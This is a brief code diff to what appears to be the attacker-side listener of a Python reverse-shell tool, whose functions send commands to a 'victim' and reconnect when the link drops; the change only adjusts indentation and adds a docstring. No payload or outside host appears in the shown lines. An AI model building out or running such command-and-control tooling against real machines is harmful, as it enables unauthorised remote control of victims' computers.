@@ -86,7 +86,7 @@ def send_commands(conn):
                 victim_response = conn.recv(4096)
                 print(victim_response.decode("utf-8"))
         except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-            reconnect()
+                reconnect()
 
 
 def create_socket():
@@ -109,6 +109,7 @@ def create_socket():
 
 
 def reconnect():
+    """Function used to reconnect with the victim"""
     print("Connection with host was lost")
     s.listen(1)
     print("Listening on " + str(host) + ":" + str(port))
